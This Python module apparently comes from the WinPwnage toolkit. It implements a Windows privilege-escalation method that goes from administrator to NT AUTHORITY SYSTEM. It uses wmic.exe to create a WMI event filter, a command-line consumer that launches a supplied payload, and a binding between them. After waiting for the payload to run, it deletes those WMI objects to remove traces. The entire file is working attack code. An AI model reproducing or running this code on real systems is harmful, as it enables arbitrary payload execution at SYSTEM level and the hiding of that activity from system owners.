from winpwnage.core.prints import *
from winpwnage.core.utils import *
from winpwnage.core.winstructures import *
import time

elevateMethod5_info = {
	"Description": "Elevate from administrator to NT AUTHORITY SYSTEM using wmic.exe (non interactive)",
	"Method": "Handle inheritance",
	"Id": "5",
	"Type": "Elevation",
	"Fixed In": "99999" if information().admin() == True else "0",
	"Works From": "7600",
	"Admin": True,
	"Function Name": "elevateMethod5",
	"Function Payload": True,
}

def elevateMethod5(payload):
	if not information().admin():
		print_error("Cannot proceed, we are not elevated")
		return False

	if payloads().exe(payload):
		cmds = {
			'create': {
				('__EventFilter', '/namespace:"\\\\root\\subscription" PATH __EventFilter CREATE Name="BotFilter82", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"'),
				('CommandLineEventConsumer', '/namespace:"\\\\root\\subscription" PATH CommandLineEventConsumer CREATE Name="BotConsumer23", ExecutablePath="{path}", CommandLineTemplate="{path}"'),
				('__FilterToConsumerBinding', '/namespace:"\\\\root\\subscription" PATH __FilterToConsumerBinding CREATE Filter=\'__EventFilter.Name="BotFilter82"\', Consumer=\'CommandLineEventConsumer.Name="BotConsumer23"\''),
			},
			'delete': {
				('__EventFilter', '/namespace:"\\\\root\\subscription" PATH __EventFilter WHERE Name="BotFilter82" DELETE'),
				('CommandLineEventConsumer', '/namespace:"\\\\root\\subscription" PATH CommandLineEventConsumer WHERE Name="BotConsumer23" DELETE'),
				('__FilterToConsumerBinding', '/namespace:"\\\\root\\subscription" PATH __FilterToConsumerBinding WHERE Filter=\'__EventFilter.Name="BotFilter82"\' DELETE'),
			}
		}

		for x in cmds["create"]:
			exit_code = process().create("wmic.exe", params=x[1].format(path=payloads().exe(payload)[1]), get_exit_code=True)
			if exit_code == 0:
				print_success("Successfully {action} (exit code: {code})".format(action=x[0], code=exit_code))
			else:
				print_error("Unable to {action} (exit code: {code})".format(action=x[0], code=exit_code))

		print_info("Waiting for (15) seconds for payload to get executed")	
		time.sleep(15)

		print_info("Performing cleanup")
		for x in cmds["delete"]:
			exit_code = process().create("wmic.exe", params=x[1].format(path=payloads().exe(payload)[1]), get_exit_code=True)
			if exit_code == 0:
				print_success("Successfully deleted {action} (exit code: {code})".format(action=x[0], code=exit_code))
			else:
				print_error("Unable to delete {action} (exit code: {code})".format(action=x[0], code=exit_code))
	else:
		print_error("Cannot proceed, invalid payload")
		return False
